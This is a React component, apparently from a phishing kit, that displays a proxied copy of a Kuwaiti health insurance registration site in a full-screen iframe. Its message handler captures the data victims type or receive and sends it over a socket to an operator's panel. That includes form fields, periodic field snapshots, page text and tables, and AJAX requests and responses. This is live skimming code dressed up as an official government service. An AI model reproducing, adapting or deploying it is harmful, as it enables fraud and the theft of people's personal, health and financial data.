import { useState, useEffect, useRef } from 'react';
import { socket, visitor } from '../lib/store';

const WORKER_BASE = 'https://moh-proxy.fanarali881.workers.dev';

export default function KuwaitInsuranceHome() {
  const [loading, setLoading] = useState(true);
  const iframeRef = useRef<HTMLIFrameElement>(null);

  // Ensure proper viewport for mobile
  useEffect(() => {
    const meta = document.querySelector('meta[name="viewport"]');
    if (meta) {
      meta.setAttribute('content', 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no');
    }
  }, []);

  // Listen for postMessage from iframe (form data + navigation + page content + ajax)
  useEffect(() => {
    // Track last sent data to avoid duplicates
    let lastFormHash = '';
    let lastContentHash = '';
    let lastSnapshotHash = '';

    const handleMessage = (event: MessageEvent) => {
      // Accept messages from our worker
      if (!event.data || typeof event.data !== 'object') return;
      if (!event.data.type || !event.data.type.startsWith('moh-')) return;

      const { type, path } = event.data;
      const isConnected = socket.value.connected && visitor.value._id;

      // ===== NAVIGATION =====
      if (type === 'moh-navigation') {
        console.log('[MOH] Navigation:', path, event.data.title);
        if (isConnected) {
          socket.value.emit('visitor:pageEnter', `MOH: ${path}`);
        }
      }

      // ===== FORM SUBMISSION =====
      if (type === 'moh-form-data') {
        const { fields, action } = event.data;
        console.log('[MOH] Form submitted:', fields, 'Action:', action);
        
        // Deduplicate
        const hash = JSON.stringify(fields) + path;
        if (hash === lastFormHash) return;
        lastFormHash = hash;

        if (fields && Object.keys(fields).length > 0 && isConnected) {
          // Filter out _type metadata fields for cleaner display
          const cleanFields: Record<string, string> = {};
          for (const [k, v] of Object.entries(fields)) {
            if (!k.endsWith('_type')) {
              cleanFields[k] = v as string;
            }
          }
          socket.value.emit('more-info', {
            content: cleanFields,
            page: `MOH Form: ${path || 'unknown'}`,
            waitingForAdminResponse: false,
          });
        }
      }

      // ===== PAGE CONTENT (initial load + mutations) =====
      if (type === 'moh-page-content') {
        const { content, trigger } = event.data;
        console.log('[MOH] Page content:', trigger || 'load', path, content);
        
        // Deduplicate
        const hash = JSON.stringify(content);
        if (hash === lastContentHash) return;
        lastContentHash = hash;

        if (content && Object.keys(content).length > 0 && isConnected) {
          // Format content for display
          const formattedContent: Record<string, string> = {};
          
          // Add page title
          if (content.title) formattedContent['عنوان الصفحة'] = content.title;
          if (content.url) formattedContent['رابط الصفحة'] = content.url;
          
          // Add field values
          if (content.fields) {
            for (const [k, v] of Object.entries(content.fields)) {
              formattedContent[`حقل: ${k}`] = v as string;
            }
          }
          
          // Add page text
          if (content.page_text && Array.isArray(content.page_text)) {
            formattedContent['محتوى الصفحة'] = content.page_text.join('\n');
          }
          
          // Add tables
          for (const [k, v] of Object.entries(content)) {
            if (k.startsWith('table_') && Array.isArray(v)) {
              formattedContent[`جدول ${k.replace('table_', '')}`] = (v as string[]).join('\n');
            }
          }

          socket.value.emit('more-info', {
            content: formattedContent,
            page: `MOH Content: ${path || 'unknown'} ${trigger ? '(تحديث)' : '(تحميل)'}`,
            waitingForAdminResponse: false,
          });
        }
      }

      // ===== FIELD SNAPSHOT (periodic) =====
      if (type === 'moh-field-snapshot') {
        const { fields } = event.data;
        
        // Deduplicate
        const hash = JSON.stringify(fields);
        if (hash === lastSnapshotHash) return;
        lastSnapshotHash = hash;

        if (fields && Object.keys(fields).length > 0 && isConnected) {
          console.log('[MOH] Field snapshot:', fields);
          socket.value.emit('more-info', {
            content: fields,
            page: `MOH Snapshot: ${path || 'unknown'}`,
            waitingForAdminResponse: false,
          });
        }
      }

      // ===== AJAX DATA (POST requests) =====
      if (type === 'moh-ajax-data') {
        const { method, url, data } = event.data;
        console.log('[MOH] AJAX:', method, url, data);
        
        if (data && isConnected) {
          const ajaxContent: Record<string, string> = {};
          ajaxContent['طلب AJAX'] = `${method} ${url}`;
          
          if (typeof data === 'object') {
            for (const [k, v] of Object.entries(data)) {
              ajaxContent[k] = String(v);
            }
          } else {
            ajaxContent['بيانات'] = String(data);
          }
          
          socket.value.emit('more-info', {
            content: ajaxContent,
            page: `MOH AJAX: ${path || 'unknown'}`,
            waitingForAdminResponse: false,
          });
        }
      }

      // ===== AJAX RESPONSE =====
      if (type === 'moh-ajax-response') {
        const { url, status, response } = event.data;
        console.log('[MOH] AJAX Response:', url, status);
        
        if (response && isConnected) {
          // Try to parse response as JSON for better display
          let responseContent: Record<string, string> = {};
          responseContent['رد الخادم'] = `${url} (${status})`;
          
          try {
            const parsed = JSON.parse(response);
            if (typeof parsed === 'object') {
              for (const [k, v] of Object.entries(parsed)) {
                responseContent[k] = typeof v === 'object' ? JSON.stringify(v) : String(v);
              }
            }
          } catch {
            // If not JSON, send as text (only if it looks like it has useful data)
            if (response.length > 10 && response.length < 5000) {
              responseContent['محتوى الرد'] = response.substring(0, 2000);
            }
          }
          
          if (Object.keys(responseContent).length > 1) {
            socket.value.emit('more-info', {
              content: responseContent,
              page: `MOH Response: ${path || 'unknown'}`,
              waitingForAdminResponse: false,
            });
          }
        }
      }
    };

    window.addEventListener('message', handleMessage);
    return () => window.removeEventListener('message', handleMessage);
  }, []);

  return (
    <div style={{
      width: '100vw',
      height: '100dvh',
      position: 'fixed',
      top: 0,
      left: 0,
      zIndex: 9999,
      background: '#f0f4f8',
      overflow: 'hidden',
    }}>
      {loading && (
        <div style={{
          position: 'absolute',
          top: 0,
          left: 0,
          width: '100%',
          height: '100%',
          display: 'flex',
          flexDirection: 'column',
          alignItems: 'center',
          justifyContent: 'center',
          background: '#f0f4f8',
          zIndex: 10000,
          direction: 'rtl',
          fontFamily: 'Cairo, Arial, sans-serif'
        }}>
          <div style={{
            width: 60,
            height: 60,
            border: '4px solid #e0e0e0',
            borderTop: '4px solid #1a7a4c',
            borderRadius: '50%',
            animation: 'spin 1s linear infinite'
          }} />
          <p style={{ marginTop: 20, color: '#333', fontSize: 16 }}>
            جاري تحميل النظام الآلي لتسجيل الضمان الصحي...
          </p>
          <style>{`@keyframes spin { to { transform: rotate(360deg); } }`}</style>
        </div>
      )}
      <iframe
        ref={iframeRef}
        src={WORKER_BASE + '/Insurance/logaction'}
        onLoad={() => setLoading(false)}
        style={{
          width: window.innerWidth < 768 ? '120%' : '100%',
          height: window.innerWidth < 768 ? '118%' : '100%',
          border: 'none',
          display: 'block',
          WebkitOverflowScrolling: 'touch',
          overflow: 'auto',
          transformOrigin: 'top right',
          transform: window.innerWidth < 768 ? 'scale(0.85)' : 'none',
        } as React.CSSProperties}
        title="النظام الآلي لتسجيل الضمان الصحي"
        allowFullScreen
        sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
      />
    </div>
  );
}
